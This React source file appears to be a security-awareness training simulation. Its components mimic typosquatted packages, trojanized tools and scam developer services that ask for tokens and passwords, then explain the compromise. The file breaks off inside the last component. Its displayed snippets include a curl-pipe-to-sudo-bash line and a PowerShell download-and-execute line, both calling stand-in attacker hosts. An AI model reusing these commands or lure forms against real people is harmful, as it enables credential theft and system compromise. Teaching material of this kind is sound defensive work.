import React, { useState } from 'react';

// ID 230: Fake bumpversion PyPI Package UI
export function BumpversionSim({ onComplete }) {
  const [step, setStep] = useState(1);
  const [token, setToken] = useState('');
  const [email, setEmail] = useState('');
  const [loading, setLoading] = useState(false);

  const handleInstall = (e) => {
    e.preventDefault();
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setStep(2);
      setTimeout(() => onComplete(['PyPI Secret API Token', 'GitHub Personal Access Token', 'Local Git Credentials']), 1600);
    }, 1200);
  };

  return (
    <div className="simulation-card" style={{ background: '#0f172a', border: '1px solid #334155', borderRadius: '16px', padding: '1.8rem', maxWidth: '680px', margin: '0 auto', color: '#f8fafc' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', borderBottom: '1px solid #1e293b', paddingBottom: '12px', marginBottom: '16px' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
          <span style={{ fontSize: '1.8rem' }}>📦</span>
          <div>
            <h3 style={{ margin: 0, fontSize: '1.25rem', color: '#38bdf8' }}>bumpversion-py <span style={{ fontSize: '0.8rem', background: '#0284c7', color: '#fff', padding: '2px 8px', borderRadius: '12px' }}>v1.0.4-malicious</span></h3>
            <span style={{ fontSize: '0.75rem', color: '#94a3b8' }}>PyPI Package Repository Mirror • Published 2 days ago</span>
          </div>
        </div>
        <span style={{ background: 'rgba(239, 68, 68, 0.2)', color: '#f87171', border: '1px solid #ef4444', padding: '4px 10px', borderRadius: '8px', fontSize: '0.75rem', fontWeight: 'bold' }}>TYPOSQUATTING</span>
      </div>

      <div style={{ background: '#1e293b', padding: '12px', borderRadius: '8px', marginBottom: '16px', fontSize: '0.85rem', color: '#cbd5e1', borderLeft: '3px solid #38bdf8' }}>
        ℹ️ <strong>Package Warning:</strong> You typed `pip install bumpversion-py` instead of the official `bumpversion`. This typosquatted package injects an auto-tagging credential harvester into your Python environment.
      </div>

      {step === 1 ? (
        <form onSubmit={handleInstall} style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
          <div style={{ background: '#020617', padding: '12px', borderRadius: '6px', border: '1px solid #1e293b', fontFamily: 'monospace', fontSize: '0.85rem', color: '#22c55e' }}>
            $ pip install bumpversion-py --upgrade<br/>
            <span style={{ color: '#94a3b8' }}>Collecting bumpversion-py... Running setup.py install... [WAITING FOR AUTH]</span>
          </div>

          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#e2e8f0' }}>Enter PyPI API / GitHub Release Token (required by setup.py post-install hook):</label>
            <input required type="text" placeholder="pypi-AgEIcHlwaS5vcmc... / ghp_xxxxxxxxxxxxxxxxxxxx" value={token} onChange={e => setToken(e.target.value)} style={{ width: '100%', padding: '10px', background: '#1e293b', border: '1px solid #475569', borderRadius: '6px', color: '#fff', fontFamily: 'monospace' }} />
          </div>
          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#e2e8f0' }}>Git Global Author Email:</label>
            <input required type="email" placeholder="developer@company.com" value={email} onChange={e => setEmail(e.target.value)} style={{ width: '100%', padding: '10px', background: '#1e293b', border: '1px solid #475569', borderRadius: '6px', color: '#fff' }} />
          </div>

          <button type="submit" disabled={loading} className="btn" style={{ background: '#0284c7', color: '#fff', padding: '12px', borderRadius: '8px', fontWeight: 'bold', border: 'none', cursor: 'pointer' }}>
            {loading ? 'Running setup.py post-install hook...' : 'Complete Installation & Tag Release'}
          </button>
        </form>
      ) : (
        <div style={{ background: 'rgba(239, 68, 68, 0.15)', border: '1px solid #ef4444', padding: '1.5rem', borderRadius: '8px', textAlign: 'center' }}>
          <div style={{ fontSize: '2.5rem', marginBottom: '8px' }}>🚨</div>
          <h4 style={{ color: '#f87171', margin: '0 0 8px 0' }}>PyPI Token Exfiltrated!</h4>
          <p style={{ fontSize: '0.85rem', color: '#cbd5e1', margin: 0 }}>The malicious `setup.py` script read your PyPI token (`{token.slice(0,10)}...`) and uploaded it to an external C2 server (`http://pypi-stats-collector.pw`).</p>
        </div>
      )}
    </div>
  );
}

// ID 241: Fake Chi Router Go/Node Package UI
export function ChiRouterSim({ onComplete }) {
  const [step, setStep] = useState(1);
  const [awsKey, setAwsKey] = useState('');
  const [dbUri, setDbUri] = useState('');
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setStep(2);
      setTimeout(() => onComplete(['AWS Secret Access Key', 'Production Database URI', 'Server Environment Secrets']), 1600);
    }, 1200);
  };

  return (
    <div className="simulation-card" style={{ background: '#18181b', border: '1px solid #3f3f46', borderRadius: '16px', padding: '1.8rem', maxWidth: '680px', margin: '0 auto', color: '#fafafa' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px' }}>
        <h3 style={{ margin: 0, fontSize: '1.3rem', display: 'flex', alignItems: 'center', gap: '8px', color: '#a855f7' }}>
          <span>⚡</span> Chi-Router Fast Middleware Dashboard
        </h3>
        <span style={{ background: '#3b0764', color: '#d8b4fe', padding: '4px 10px', borderRadius: '8px', fontSize: '0.75rem', fontWeight: 'bold' }}>SUPPLY CHAIN CLONE</span>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px', marginBottom: '16px' }}>
        <div style={{ background: '#27272a', padding: '12px', borderRadius: '8px', border: '1px solid #3f3f46' }}>
          <div style={{ fontSize: '0.75rem', color: '#a1a1aa' }}>Throughput Benchmark</div>
          <div style={{ fontSize: '1.4rem', fontWeight: 'bold', color: '#4ade80' }}>142,000 req/sec</div>
          <div style={{ fontSize: '0.7rem', color: '#71717a' }}>10x faster than standard express/chi</div>
        </div>
        <div style={{ background: '#27272a', padding: '12px', borderRadius: '8px', border: '1px solid #3f3f46' }}>
          <div style={{ fontSize: '0.75rem', color: '#a1a1aa' }}>Memory Footprint</div>
          <div style={{ fontSize: '1.4rem', fontWeight: 'bold', color: '#60a5fa' }}>12.4 MB</div>
          <div style={{ fontSize: '0.7rem', color: '#71717a' }}>Zero-allocation router tree</div>
        </div>
      </div>

      <p style={{ fontSize: '0.85rem', color: '#d4d4d8', marginBottom: '16px' }}>
        To enable the zero-allocation C++ native bindings, the router needs initialization access to your cloud environment variables.
      </p>

      {step === 1 ? (
        <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#e4e4e7' }}>AWS IAM Secret Access Key (`process.env.AWS_SECRET_ACCESS_KEY`):</label>
            <input required type="text" placeholder="AKIAIOSFODNN7EXAMPLE / wJalrXUtnFEMI..." value={awsKey} onChange={e => setAwsKey(e.target.value)} style={{ width: '100%', padding: '10px', background: '#27272a', border: '1px solid #52525b', borderRadius: '6px', color: '#fff', fontFamily: 'monospace' }} />
          </div>
          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#e4e4e7' }}>PostgreSQL Production Connection URI (`process.env.DATABASE_URL`):</label>
            <input required type="text" placeholder="postgres://db_admin:SecretPass2026@prod-db.internal:5432/app" value={dbUri} onChange={e => setDbUri(e.target.value)} style={{ width: '100%', padding: '10px', background: '#27272a', border: '1px solid #52525b', borderRadius: '6px', color: '#fff', fontFamily: 'monospace' }} />
          </div>

          <button type="submit" disabled={loading} className="btn" style={{ background: '#9333ea', color: '#fff', padding: '12px', borderRadius: '8px', fontWeight: 'bold', border: 'none', cursor: 'pointer' }}>
            {loading ? 'Compiling native router & injecting middleware...' : 'Initialize Chi-Router Native Bindings'}
          </button>
        </form>
      ) : (
        <div style={{ background: 'rgba(239, 68, 68, 0.15)', border: '1px solid #ef4444', padding: '1.5rem', borderRadius: '8px', textAlign: 'center' }}>
          <div style={{ fontSize: '2.5rem', marginBottom: '8px' }}>💥</div>
          <h4 style={{ color: '#f87171', margin: '0 0 8px 0' }}>Cloud Environment Compromised!</h4>
          <p style={{ fontSize: '0.85rem', color: '#d4d4d8', margin: 0 }}>The `chi-router-fast` package executed an asynchronous HTTP post on startup, sending your AWS IAM keys and Postgres connection string to an unauthorized telemetry bucket.</p>
        </div>
      )}
    </div>
  );
}

// ID 242: Fake chisel Network Tunnel Tool UI
export function ChiselSim({ onComplete }) {
  const [step, setStep] = useState(1);
  const [sudoPass, setSudoPass] = useState('');
  const [sshPath, setSshPath] = useState('/home/ubuntu/.ssh/id_rsa');
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setStep(2);
      setTimeout(() => onComplete(['Root Sudo Password', 'SSH Private Keys', 'System Service Configuration']), 1600);
    }, 1200);
  };

  return (
    <div className="simulation-card" style={{ background: '#090d16', border: '1px solid #1f2937', borderRadius: '16px', padding: '1.8rem', maxWidth: '680px', margin: '0 auto', color: '#f3f4f6' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px', borderBottom: '1px solid #1f2937', paddingBottom: '12px' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
          <span style={{ fontSize: '1.6rem' }}>🔧</span>
          <h3 style={{ margin: 0, fontSize: '1.2rem', color: '#60a5fa' }}>chisel v1.9.1 Binary Release Table</h3>
        </div>
        <span style={{ background: '#1e3a8a', color: '#93c5fd', padding: '4px 10px', borderRadius: '8px', fontSize: '0.75rem', fontWeight: 'bold' }}>TROJANIZED BINARY</span>
      </div>

      <div style={{ overflowX: 'auto', marginBottom: '16px' }}>
        <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.8rem', textAlign: 'left', background: '#111827', borderRadius: '6px' }}>
          <thead>
            <tr style={{ borderBottom: '1px solid #374151', color: '#9ca3af' }}>
              <th style={{ padding: '8px' }}>Asset Name</th>
              <th style={{ padding: '8px' }}>OS / Arch</th>
              <th style={{ padding: '8px' }}>Size</th>
              <th style={{ padding: '8px' }}>Status</th>
            </tr>
          </thead>
          <tbody>
            <tr style={{ borderBottom: '1px solid #1f2937' }}>
              <td style={{ padding: '8px', color: '#60a5fa', fontFamily: 'monospace' }}>chisel_1.9.1_linux_amd64.gz</td>
              <td style={{ padding: '8px' }}>Linux x86_64</td>
              <td style={{ padding: '8px' }}>3.4 MB</td>
              <td style={{ padding: '8px', color: '#fbbf24' }}>Modified (Backdoored)</td>
            </tr>
            <tr>
              <td style={{ padding: '8px', color: '#60a5fa', fontFamily: 'monospace' }}>chisel_install_systemd.sh</td>
              <td style={{ padding: '8px' }}>Universal Script</td>
              <td style={{ padding: '8px' }}>12 KB</td>
              <td style={{ padding: '8px', color: '#f87171' }}>Rootkit Installer</td>
            </tr>
          </tbody>
        </table>
      </div>

      {step === 1 ? (
        <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '14px', background: '#111827', padding: '14px', borderRadius: '8px', border: '1px solid #374151' }}>
          <div style={{ fontSize: '0.85rem', color: '#e5e7eb', fontWeight: 'bold' }}>Executing automated systemd service installation:</div>
          <div style={{ fontFamily: 'monospace', fontSize: '0.8rem', color: '#34d399', background: '#030712', padding: '10px', borderRadius: '6px' }}>
            $ curl -sSL https://chisel-fast-net.io/install.sh | sudo bash
          </div>

          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#d1d5db' }}>System Root / Sudo Password (required for systemd unit creation):</label>
            <input required type="password" placeholder="Enter root/sudo password" value={sudoPass} onChange={e => setSudoPass(e.target.value)} style={{ width: '100%', padding: '10px', background: '#1f2937', border: '1px solid #4b5563', borderRadius: '6px', color: '#fff' }} />
          </div>
          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#d1d5db' }}>SSH Key Path to export for tunnel authentication:</label>
            <input required type="text" value={sshPath} onChange={e => setSshPath(e.target.value)} style={{ width: '100%', padding: '10px', background: '#1f2937', border: '1px solid #4b5563', borderRadius: '6px', color: '#fff', fontFamily: 'monospace' }} />
          </div>

          <button type="submit" disabled={loading} className="btn" style={{ background: '#2563eb', color: '#fff', padding: '12px', borderRadius: '8px', fontWeight: 'bold', border: 'none', cursor: 'pointer' }}>
            {loading ? 'Installing systemd service & setting persistent reverse shell...' : 'Install Chisel & Enable Systemd Daemon'}
          </button>
        </form>
      ) : (
        <div style={{ background: 'rgba(239, 68, 68, 0.15)', border: '1px solid #ef4444', padding: '1.5rem', borderRadius: '8px', textAlign: 'center' }}>
          <div style={{ fontSize: '2.5rem', marginBottom: '8px' }}>🚨</div>
          <h4 style={{ color: '#f87171', margin: '0 0 8px 0' }}>Persistent Root Reverse Shell Created!</h4>
          <p style={{ fontSize: '0.85rem', color: '#d1d5db', margin: 0 }}>Piping the unverified installation script directly into `sudo bash` allowed attackers to drop a permanent reverse shell inside `/etc/systemd/system/chisel-daemon.service`.</p>
        </div>
      )}
    </div>
  );
}

// ID 245: Fake Cirrus CI Scam UI
export function CirrusCISim({ onComplete }) {
  const [step, setStep] = useState(1);
  const [orgToken, setOrgToken] = useState('');
  const [dockerAuth, setDockerAuth] = useState('');
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setStep(2);
      setTimeout(() => onComplete(['GitHub Org Admin Token', 'Docker Registry Credentials', 'CI/CD Pipeline Secrets']), 1600);
    }, 1200);
  };

  return (
    <div className="simulation-card" style={{ background: '#0a0f1d', border: '1px solid #1e293b', borderRadius: '16px', padding: '1.8rem', maxWidth: '680px', margin: '0 auto', color: '#f1f5f9' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px', borderBottom: '1px solid #1e293b', paddingBottom: '12px' }}>
        <h3 style={{ margin: 0, fontSize: '1.25rem', color: '#38bdf8', display: 'flex', alignItems: 'center', gap: '8px' }}>
          <span>🔄</span> Cirrus CI Cloud Runner Queue Accelerator
        </h3>
        <span style={{ background: '#0f172a', color: '#38bdf8', border: '1px solid #0284c7', padding: '4px 10px', borderRadius: '8px', fontSize: '0.75rem', fontWeight: 'bold' }}>MALICIOUS GITHUB APP</span>
      </div>

      <div style={{ background: '#0f172a', padding: '14px', borderRadius: '8px', marginBottom: '16px', border: '1px solid #1e293b' }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '0.8rem', color: '#94a3b8', marginBottom: '8px' }}>
          <span>Build Queue Status: <strong style={{ color: '#f59e0b' }}>14 Jobs Bottlenecked</strong></span>
          <span>Estimated Wait: <strong>42 minutes</strong></span>
        </div>
        <div style={{ width: '100%', background: '#1e293b', height: '8px', borderRadius: '4px', overflow: 'hidden' }}>
          <div style={{ width: '85%', background: '#f59e0b', height: '100%' }} />
        </div>
        <p style={{ fontSize: '0.8rem', color: '#cbd5e1', margin: '8px 0 0 0' }}>Connect our decentralized high-speed runner pool to eliminate build delays and unlock unlimited container compilation minutes.</p>
      </div>

      {step === 1 ? (
        <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#e2e8f0' }}>GitHub Organization Admin Personal Access Token (for workflow injection):</label>
            <input required type="text" placeholder="ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" value={orgToken} onChange={e => setOrgToken(e.target.value)} style={{ width: '100%', padding: '10px', background: '#1e293b', border: '1px solid #475569', borderRadius: '6px', color: '#fff', fontFamily: 'monospace' }} />
          </div>
          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#e2e8f0' }}>Docker Hub / Container Registry Auth Token (to push optimized builds):</label>
            <input required type="password" placeholder="docker-auth-token-xxxxxxxxxxxx" value={dockerAuth} onChange={e => setDockerAuth(e.target.value)} style={{ width: '100%', padding: '10px', background: '#1e293b', border: '1px solid #475569', borderRadius: '6px', color: '#fff', fontFamily: 'monospace' }} />
          </div>

          <button type="submit" disabled={loading} className="btn" style={{ background: '#0284c7', color: '#fff', padding: '12px', borderRadius: '8px', fontWeight: 'bold', border: 'none', cursor: 'pointer' }}>
            {loading ? 'Injecting runner workflow into .github/workflows/...' : 'Authorize Cloud Runner Pool Integration'}
          </button>
        </form>
      ) : (
        <div style={{ background: 'rgba(239, 68, 68, 0.15)', border: '1px solid #ef4444', padding: '1.5rem', borderRadius: '8px', textAlign: 'center' }}>
          <div style={{ fontSize: '2.5rem', marginBottom: '8px' }}>🚨</div>
          <h4 style={{ color: '#f87171', margin: '0 0 8px 0' }}>CI/CD Pipeline Hijacked!</h4>
          <p style={{ fontSize: '0.85rem', color: '#cbd5e1', margin: 0 }}>The third-party GitHub App injected a malicious step into `.github/workflows/cirrus.yml` that dumps your organization's environment variables and Docker registry secrets.</p>
        </div>
      )}
    </div>
  );
}

// ID 247: Fake Clean Architecture Pro Boilerplate UI
export function CleanArchitectureSim({ onComplete }) {
  const [step, setStep] = useState(1);
  const [license, setLicense] = useState('');
  const [envPath, setEnvPath] = useState('C:\\Users\\dev\\projects\\my-service\\.env.production');
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setStep(2);
      setTimeout(() => onComplete(['Production Environment Variables', 'Cloud Deployment API Keys', 'Local Workspace Path']), 1600);
    }, 1200);
  };

  return (
    <div className="simulation-card" style={{ background: '#131823', border: '1px solid #283245', borderRadius: '16px', padding: '1.8rem', maxWidth: '680px', margin: '0 auto', color: '#f1f5f9' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px' }}>
        <h3 style={{ margin: 0, fontSize: '1.25rem', color: '#818cf8', display: 'flex', alignItems: 'center', gap: '8px' }}>
          <span>🏗️</span> Clean Architecture Pro Scaffolder
        </h3>
        <span style={{ background: '#312e81', color: '#c7d2fe', padding: '4px 10px', borderRadius: '8px', fontSize: '0.75rem', fontWeight: 'bold' }}>MALICIOUS TEMPLATE</span>
      </div>

      <div style={{ background: '#0b0f17', padding: '14px', borderRadius: '8px', border: '1px solid #1e293b', fontFamily: 'monospace', fontSize: '0.8rem', color: '#a5b4fc', marginBottom: '16px' }}>
        <div>📁 my-microservice-boilerplate/</div>
        <div style={{ paddingLeft: '14px', color: '#cbd5e1' }}>├── 📁 src/Domain/Entities/</div>
        <div style={{ paddingLeft: '14px', color: '#cbd5e1' }}>├── 📁 src/Application/UseCases/</div>
        <div style={{ paddingLeft: '14px', color: '#f87171' }}>├── 📄 pre-compiled/CleanArch.Core.dll [OBFUSCATED TELEMETRY]</div>
        <div style={{ paddingLeft: '14px', color: '#cbd5e1' }}>└── 📄 package.json / CleanArch.csproj</div>
      </div>

      {step === 1 ? (
        <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#e2e8f0' }}>Enterprise Boilerplate License Key / GitHub Token:</label>
            <input required type="text" placeholder="PRO-CLEAN-ARCH-8892-xxxx" value={license} onChange={e => setLicense(e.target.value)} style={{ width: '100%', padding: '10px', background: '#1e293b', border: '1px solid #475569', borderRadius: '6px', color: '#fff', fontFamily: 'monospace' }} />
          </div>
          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#e2e8f0' }}>Local / Server Production `.env` Configuration Path to sync:</label>
            <input required type="text" value={envPath} onChange={e => setEnvPath(e.target.value)} style={{ width: '100%', padding: '10px', background: '#1e293b', border: '1px solid #475569', borderRadius: '6px', color: '#fff', fontFamily: 'monospace' }} />
          </div>

          <button type="submit" disabled={loading} className="btn" style={{ background: '#4f46e5', color: '#fff', padding: '12px', borderRadius: '8px', fontWeight: 'bold', border: 'none', cursor: 'pointer' }}>
            {loading ? 'Unpacking pre-compiled DLL & linking .env...' : 'Scaffold Boilerplate & Run Pre-Compiled Loader'}
          </button>
        </form>
      ) : (
        <div style={{ background: 'rgba(239, 68, 68, 0.15)', border: '1px solid #ef4444', padding: '1.5rem', borderRadius: '8px', textAlign: 'center' }}>
          <div style={{ fontSize: '2.5rem', marginBottom: '8px' }}>🚨</div>
          <h4 style={{ color: '#f87171', margin: '0 0 8px 0' }}>Pre-Compiled DLL Backdoor Triggered!</h4>
          <p style={{ fontSize: '0.85rem', color: '#cbd5e1', margin: 0 }}>The obfuscated `CleanArch.Core.dll` read your `.env.production` file on startup and sent all your API keys and database credentials to an unknown endpoint.</p>
        </div>
      )}
    </div>
  );
}

// ID 250: Fake Comet ML Scam UI
export function CometMLSim({ onComplete }) {
  const [step, setStep] = useState(1);
  const [hfToken, setHfToken] = useState('');
  const [s3Bucket, setS3Bucket] = useState('s3://ml-training-checkpoints-prod/');
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setStep(2);
      setTimeout(() => onComplete(['OpenAI / Hugging Face API Keys', 'AWS S3 Checkpoint Credentials', 'Model Training Datasets']), 1600);
    }, 1200);
  };

  return (
    <div className="simulation-card" style={{ background: '#111827', border: '1px solid #374151', borderRadius: '16px', padding: '1.8rem', maxWidth: '680px', margin: '0 auto', color: '#f9fafb' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px', borderBottom: '1px solid #374151', paddingBottom: '12px' }}>
        <h3 style={{ margin: 0, fontSize: '1.25rem', color: '#fb923c', display: 'flex', alignItems: 'center', gap: '8px' }}>
          <span>🧪</span> Comet ML Python Notebook Tracker
        </h3>
        <span style={{ background: '#431407', color: '#fdba74', padding: '4px 10px', borderRadius: '8px', fontSize: '0.75rem', fontWeight: 'bold' }}>AI/ML CREDENTIAL HARVESTER</span>
      </div>

      <div style={{ background: '#1f2937', padding: '12px', borderRadius: '8px', fontFamily: 'monospace', fontSize: '0.8rem', color: '#e5e7eb', marginBottom: '16px', borderLeft: '4px solid #fb923c' }}>
        <div style={{ color: '#9ca3af' }}># Jupyter Notebook / Training Script Setup</div>
        <div><span style={{ color: '#f43f5e' }}>import</span> comet_ml_extension <span style={{ color: '#f43f5e' }}>as</span> comet</div>
        <div>comet.init(project_name=<span style={{ color: '#a7f3d0' }}>"LLM-FineTuning-v4"</span>, sync_env=<span style={{ color: '#60a5fa' }}>True</span>)</div>
      </div>

      {step === 1 ? (
        <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#d1d5db' }}>OpenAI / Hugging Face API Key (`HF_TOKEN` / `OPENAI_API_KEY`):</label>
            <input required type="text" placeholder="sk-proj-xxxxxxxx... / hf_xxxxxxxxxxxxxxxxxx" value={hfToken} onChange={e => setHfToken(e.target.value)} style={{ width: '100%', padding: '10px', background: '#374151', border: '1px solid #4b5563', borderRadius: '6px', color: '#fff', fontFamily: 'monospace' }} />
          </div>
          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#d1d5db' }}>AWS S3 Bucket URI for model weight checkpoint syncing:</label>
            <input required type="text" value={s3Bucket} onChange={e => setS3Bucket(e.target.value)} style={{ width: '100%', padding: '10px', background: '#374151', border: '1px solid #4b5563', borderRadius: '6px', color: '#fff', fontFamily: 'monospace' }} />
          </div>

          <button type="submit" disabled={loading} className="btn" style={{ background: '#ea580c', color: '#fff', padding: '12px', borderRadius: '8px', fontWeight: 'bold', border: 'none', cursor: 'pointer' }}>
            {loading ? 'Attaching memory scanner & syncing weights...' : 'Initialize ML Tracker & Hook Training Loop'}
          </button>
        </form>
      ) : (
        <div style={{ background: 'rgba(239, 68, 68, 0.15)', border: '1px solid #ef4444', padding: '1.5rem', borderRadius: '8px', textAlign: 'center' }}>
          <div style={{ fontSize: '2.5rem', marginBottom: '8px' }}>🤖</div>
          <h4 style={{ color: '#f87171', margin: '0 0 8px 0' }}>AI API Keys & Model Weights Stolen!</h4>
          <p style={{ fontSize: '0.85rem', color: '#d1d5db', margin: 0 }}>The spoofed `comet-ml-extension` scanned your Python memory buffer for OpenAI keys and initiated an S3 bucket sync to steal proprietary training checkpoints.</p>
        </div>
      )}
    </div>
  );
}

// ID 251: Fake Commando VM Scam UI
export function CommandoVMSim({ onComplete }) {
  const [step, setStep] = useState(1);
  const [adminPass, setAdminPass] = useState('');
  const [vpnIp, setVpnIp] = useState('10.0.4.15 (Corp-Internal-DC)');
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setStep(2);
      setTimeout(() => onComplete(['Windows Local Administrator Password', 'Corporate Network Topology', 'Active Directory Domain Credentials']), 1600);
    }, 1200);
  };

  return (
    <div className="simulation-card" style={{ background: '#0a0a0a', border: '1px solid #262626', borderRadius: '16px', padding: '1.8rem', maxWidth: '680px', margin: '0 auto', color: '#ededed' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px' }}>
        <h3 style={{ margin: 0, fontSize: '1.25rem', color: '#ef4444', display: 'flex', alignItems: 'center', gap: '8px' }}>
          <span>🛡️</span> Mandiant Commando VM v3.0 Mirror
        </h3>
        <span style={{ background: '#450a0a', color: '#fca5a5', padding: '4px 10px', borderRadius: '8px', fontSize: '0.75rem', fontWeight: 'bold' }}>BACKDOORED POWERSHELL</span>
      </div>

      <div style={{ background: '#171717', padding: '14px', borderRadius: '8px', border: '1px solid #262626', marginBottom: '16px' }}>
        <div style={{ fontSize: '0.85rem', color: '#a3a3a3', marginBottom: '6px' }}>Installation Requirements Checklist:</div>
        <div style={{ display: 'flex', flexDirection: 'column', gap: '4px', fontSize: '0.8rem', color: '#f87171' }}>
          <div>[✔] Windows Defender / Antivirus must be temporarily disabled</div>
          <div>[✔] Script must run with Administrative Bypass Execution Policy</div>
          <div>[✔] Corporate Active Directory network connection active</div>
        </div>
      </div>

      {step === 1 ? (
        <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
          <div style={{ fontFamily: 'monospace', fontSize: '0.75rem', color: '#facc15', background: '#050505', padding: '10px', borderRadius: '6px' }}>
            PS C:\&gt; iex (New-Object Net.WebClient).DownloadString("http://commando-vm-mirror.pw/install.ps1") -BypassSecurity
          </div>

          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#d4d4d8' }}>Local Windows Administrator Password (for silent background package extraction):</label>
            <input required type="password" placeholder="Enter local Admin password" value={adminPass} onChange={e => setAdminPass(e.target.value)} style={{ width: '100%', padding: '10px', background: '#171717', border: '1px solid #404040', borderRadius: '6px', color: '#fff' }} />
          </div>
          <div>
            <label style={{ display: 'block', fontSize: '0.85rem', marginBottom: '6px', color: '#d4d4d8' }}>Corporate Domain Controller / VPN Subnet to scan for tool dependencies:</label>
            <input required type="text" value={vpnIp} onChange={e => setVpnIp(e.target.value)} style={{ width: '100%', padding: '10px', background: '#171717', border: '1px solid #404040', borderRadius: '6px', color: '#fff', fontFamily: 'monospace' }} />
          </div>

          <button type="submit" disabled={loading} className="btn" style={{ background: '#dc2626', color: '#fff', padding: '12px', borderRadius: '8px', fontWeight: 'bold', border: 'none', cursor: 'pointer' }}>
            {loading ? 'Disabling Defender & executing Cobalt Strike beacon...' : 'Execute Commando VM PowerShell Setup'}
          </button>
        </form>
      ) : (
        <div style={{ background: 'rgba(239, 68, 68, 0.15)', border: '1px solid #ef4444', padding: '1.5rem', borderRadius: '8px', textAlign: 'center' }}>
          <div style={{ fontSize: '2.5rem', marginBottom: '8px' }}>🚨</div>
          <h4 style={{ color: '#f87171', margin: '0 0 8px 0' }}>Cobalt Strike Beacon Deployed!</h4>
          <p style={{ fontSize: '0.85rem', color: '#d4d4d8', margin: 0 }}>Running unverified PowerShell bypass scripts with admin privileges allowed attackers to drop a persistent Cobalt Strike beacon and map your Active Directory domain.</p>
        </div>
      )}
    </div>
  );
}

// ID 252: Fake commitizen Scam UI
export function CommitizenSim({ onComplete }) {
  const [step, setStep] = useState(1);
  const [gitToken, setGitToken] = useState('');
  const [repoUrl, setRepoUrl] = useState('git@github.com:enterprise-org/core-backend.git');
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      setStep(2);
      setTimeout(() => onComplete(['Git SSH Passphrase / PAT', 'Source Code Repository Access', 'Developer User Credentials']), 1600);
    }, 1200);
  };

  return (
    <div className="simulation-card" style={{ background: '#0d1117', border: '1px solid #30363d', borderRadius: '16px', padding: '1.8rem', maxWidth: '680px', margin: '0 auto', color: '#c9d1d9' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px', borderBottom: '1px solid #21262d', paddingBottom: '12px' }}>
        <h3 style={{ margin: 0, fontSize: '1.25rem', color: '#58a6ff', display: 'flex', alignItems: 'center', gap: '8px' }}>
          <span>⌨️</span> commitizen-helper-pro CLI Setup
        </h3>
        <span style={{ background: '#21262d', color: '#ff7b72', border: '1px solid #f85149', padding: '4px 10px', borderRadius: '8px', fontSize: '0.75rem', fontWeight: 'bold' }}>MALICIOUS NPM PACKAGE</span>
      </div>

      <p style={{ fontSize: '0.85rem', color: '#8b949e', marginBottom: '16px' }}>
        Global package `commitizen-helper-pro` installed. To auto-format conventional commits across all local git repositories, configure the global git credential interceptor.
      </p>

      {step === 1 ? (
        <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
